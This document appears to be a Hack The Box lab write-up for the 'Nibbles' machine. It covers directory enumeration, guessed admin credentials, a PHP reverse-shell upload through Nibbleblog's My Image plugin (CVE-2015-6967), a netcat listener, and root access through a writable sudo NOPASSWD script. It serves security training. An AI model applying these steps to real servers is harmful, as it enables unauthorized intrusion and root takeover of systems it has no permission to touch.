---
title: HTB — Nibbles
type: lab-writeup
platform: HTB
difficulty: foundational
os: Linux
status: Complete
date: 2026-03-27
tags:
  - foundational
  - lab
  - HTB
  - linux
  - web
  - cms
  - nibbleblog
  - file-upload
  - sudo
---

# HTB — Nibbles

## Lab Info

| Field | Value |
|---|---|
| Platform | Hack The Box |
| Box | Nibbles |
| Difficulty | Easy |
| OS | Ubuntu 16.04 |
| IP | Machine IP (assigned at launch) |
| Date | 2026-03-27 |

> **Summary:** Hidden Nibbleblog CMS with guessable admin creds allows arbitrary file upload via the "My Image" plugin (CVE-2015-6967), leading to PHP reverse shell. Sudo misconfiguration on a user-writable script grants root.

---

## Objectives

- [x] Recon: discover hidden /nibbleblog directory
- [x] Exploit: upload PHP reverse shell via Nibbleblog plugin
- [x] Escalate: abuse sudo rights on writable script
- [x] Capture user and root flags

---

## Enumeration

### Port scan

```bash
nmap -sC -sV -oN nmap/nibbles_initial <MACHINE_IP>
```

**Open ports:**

| Port | Service | Notes |
|---|---|---|
| 22/tcp | ssh | OpenSSH 7.2p2 |
| 80/tcp | http | Apache httpd 2.4.18 |

### Web enumeration

- `http://<IP>` shows "Hello world!" — view source reveals HTML comment: `/nibbleblog/`
- `http://<IP>/nibbleblog/` — Nibbleblog CMS
- Directory busting finds `/nibbleblog/admin.php` (login page) and `/nibbleblog/content/` (directory listing enabled)

```bash
gobuster dir -u http://<IP>/nibbleblog/ -w /usr/share/wordlists/dirb/common.txt -x php,txt
```

- `/nibbleblog/content/private/users.xml` leaks username: `admin`

### Credential guessing

Admin login: `admin` / `nibbles` (box name as password — common CTF pattern)

> **Note:** Nibbleblog has no brute-force lockout by default, but attempting too many logins triggers a blacklist. Manual guessing or small targeted list recommended.

---

## Vulnerability Background

**CVE-2015-6967** — Nibbleblog File Upload Vulnerability

| Field | Detail |
|---|---|
| CVE | CVE-2015-6967 |
| Affected | Nibbleblog ≤ 4.0.3 |
| Type | Unrestricted file upload |
| Impact | Remote code execution via arbitrary PHP upload |
| Plugin | "My Image" plugin allows uploading any file type without validation |

---

## Foothold

### PHP reverse shell upload

1. Log in at `/nibbleblog/admin.php`
2. Navigate to Plugins → My Image → Configure
3. Upload PHP reverse shell (e.g., pentestmonkey `php-reverse-shell.php`)
4. Ignore error messages — file uploads successfully
5. Trigger shell: `http://<IP>/nibbleblog/content/private/plugins/my_image/image.php`

```bash
# Listener
nc -lvnp 4444
```

**Result:** Shell as `nibbler`

### Shell upgrade

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## Privilege Escalation

### sudo enumeration

```bash
sudo -l
```

Output:
```
User nibbler may run the following commands:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

### Exploitation

The script path does not exist yet — `nibbler` can create it with arbitrary content:

```bash
mkdir -p /home/nibbler/personal/stuff
echo '#!/bin/bash' > /home/nibbler/personal/stuff/monitor.sh
echo 'bash -i' >> /home/nibbler/personal/stuff/monitor.sh
chmod +x /home/nibbler/personal/stuff/monitor.sh
sudo /home/nibbler/personal/stuff/monitor.sh
```

**Result:** Root shell.

---

## Flags

| Flag | Location |
|---|---|
| User | `/home/nibbler/user.txt` |
| Root | `/root/root.txt` |

> Flag values omitted — record yours privately.

---

## Key Takeaways

- Always view page source — hidden paths in HTML comments are a classic finding
- CMS file upload plugins are high-value targets — check for unrestricted upload vulnerabilities
- `sudo -l` is the first command after landing on any Linux box
- Writable script with sudo NOPASSWD is a trivial root path — if you control the file content, you control root
- Directory listing enabled on `/content/` exposed internal structure and usernames

---

## Tools Used

- Nmap
- Gobuster
- Netcat
- pentestmonkey PHP reverse shell

---

## References

- [Hack The Box — Nibbles](https://app.hackthebox.com/machines/Nibbles)
- [NVD CVE-2015-6967](https://nvd.nist.gov/vuln/detail/CVE-2015-6967)

---
*Write-up completed: 2026-03-27*

## See Also

- Penetration-Testing-Methodology
- Web-Application-Testing
- Linux-Privilege-Escalation
- Gobuster
- Reverse-Shell-Cheatsheet

---
<- [[Labs-MOC]]